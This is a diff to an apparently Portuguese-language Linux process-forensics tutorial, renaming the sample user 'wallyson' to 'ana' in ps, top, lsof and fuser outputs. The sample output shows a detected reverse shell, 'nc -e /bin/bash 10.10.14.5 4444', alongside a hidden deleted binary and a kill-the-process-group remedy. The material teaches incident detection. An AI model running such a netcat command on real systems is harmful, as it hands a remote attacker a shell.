@@ -33,8 +33,8 @@ root           2  0.0  0.0      0     0 ?        S    08:42   0:00 [kthreadd]
 root         412  0.0  0.1  23104  5984 ?        Ss   08:42   0:00 /lib/systemd/systemd-journald
 root         781  0.0  0.2 314928  7424 ?        Ssl  08:42   0:00 /usr/sbin/NetworkManager --no-daemon
 postgres     902  0.0  0.6 218904 18560 ?        Ss   08:42   0:01 /usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main
-wallyson    1284  0.2  1.8 482004 58432 ?        Sl   08:43   0:09 /usr/bin/Xorg vt2 -nolisten tcp -auth /var/run/lightdm/root/:0
-wallyson    2104  0.4  2.2 612928 71236 ?        Sl   08:43   0:18 /opt/google/chrome/chrome --type=renderer
+ana    1284  0.2  1.8 482004 58432 ?        Sl   08:43   0:09 /usr/bin/Xorg vt2 -nolisten tcp -auth /var/run/lightdm/root/:0
+ana    2104  0.4  2.2 612928 71236 ?        Sl   08:43   0:18 /opt/google/chrome/chrome --type=renderer
 nobody     14271  9.1  0.3  18432  9988 ?        S    14:11   0:42 /tmp/.x11-unix/.helper`,
             outType: "info",
           },
@@ -64,7 +64,7 @@ nobody     14271  9.1  0.3  18432  9988 ?        S    14:11   0:42 /tmp/.x11-uni
           { cmd: "ps -ef --forest", desc: "Árvore ASCII (PPID -> PID).", output: "Visualiza quem nasceu de quem." },
           { cmd: "ps -L -p 1284", desc: "Lista threads (LWP) de um processo.", output: "Útil em apps multithread." },
           { cmd: "ps -o pid,user,fname,nlwp -p $(pgrep -d, sshd)", desc: "Vários PIDs em uma chamada.", output: "Combina pgrep + ps." },
-          { cmd: "ps -fU wallyson", desc: "Processos de um usuário.", output: "Bom pra segregar usuário comprometido." },
+          { cmd: "ps -fU ana", desc: "Processos de um usuário.", output: "Bom pra segregar usuário comprometido." },
         ]}
       />
 
@@ -92,7 +92,7 @@ nobody     14271  9.1  0.3  18432  9988 ?        S    14:11   0:42 /tmp/.x11-uni
           {
             comment: "ATENÇÃO: nc(14281) descende de sh(14271) que descende de bash(2032). reverse shell viva!",
             cmd: "ls -l /proc/14281/exe; cat /proc/14281/cmdline | tr '\\0' ' '",
-            out: `lrwxrwxrwx 1 wallyson wallyson 0 Apr 03 14:11 /proc/14281/exe -> /usr/bin/nc.openbsd
+            out: `lrwxrwxrwx 1 ana ana 0 Apr 03 14:11 /proc/14281/exe -> /usr/bin/nc.openbsd
 nc -e /bin/bash 10.10.14.5 4444`,
             outType: "error",
           },
@@ -119,10 +119,10 @@ MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1771.1 avail Mem
 
     PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
   14271 nobody    20   0   18432   9988    856 S   9.1   0.3   0:42.18 helper
-   2104 wallyson  20   0  612928  71236  44128 S   4.2   1.8   0:18.41 chrome
-   1284 wallyson  20   0  482004  58432  31200 S   2.0   1.5   0:09.12 Xorg
+   2104 ana  20   0  612928  71236  44128 S   4.2   1.8   0:18.41 chrome
+   1284 ana  20   0  482004  58432  31200 S   2.0   1.5   0:09.12 Xorg
     902 postgres  20   0  218904  18560  17280 S   0.1   0.4   0:01.04 postgres
-   2032 wallyson  20   0   12480   5120   3008 S   0.0   0.1   0:00.18 bash`,
+   2032 ana  20   0   12480   5120   3008 S   0.0   0.1   0:00.18 bash`,
             outType: "info",
           },
         ]}
@@ -204,15 +204,15 @@ helper  14271 nobody    3w   REG    8,1     91342  198286 /tmp/.x11-unix/.log`,
             comment: "binarios DELETADOS mas ainda em execução (técnica de evasão clássica)",
             cmd: "sudo lsof | grep '(deleted)' | head -3",
             out: `helper    14271 nobody  txt    REG    8,1   18248  198284 /tmp/.x11-unix/.helper (deleted)
-gpg-agent  3201 wallyson 4u  REG    8,1     128  198901 /tmp/gpg-agent.NfQq3 (deleted)`,
+gpg-agent  3201 ana 4u  REG    8,1     128  198901 /tmp/gpg-agent.NfQq3 (deleted)`,
             outType: "info",
           },
           {
             comment: "fuser: o que está usando este arquivo/diretorio (útil pra desmontar pendrive)",
             cmd: "fuser -v /media/usb",
             out: `                     USER        PID ACCESS COMMAND
-/media/usb:          wallyson   15021 ..c..  bash
-                     wallyson   15044 F....  vim`,
+/media/usb:          ana   15021 ..c..  bash
+                     ana   15044 F....  vim`,
             outType: "default",
           },
         ]}
@@ -358,7 +358,7 @@ PID=$(sudo lsof -i :4444 -sTCP:ESTABLISHED -t | head -1)
 pstree -p $PID
 kill -9 -$(ps -o pgid= $PID | tr -d ' ')`}
         expected={`COMMAND   PID  USER   FD   TYPE DEVICE  SIZE/OFF NODE NAME
-bash    18392  wallyson  2u  IPv4 247103      0t0  TCP 127.0.0.1:48122->127.0.0.1:4444 (ESTABLISHED)
+bash    18392  ana  2u  IPv4 247103      0t0  TCP 127.0.0.1:48122->127.0.0.1:4444 (ESTABLISHED)
 
 bash(18392)───bash(18393)
 (processo morto, pgid inteiro encerrado)`}
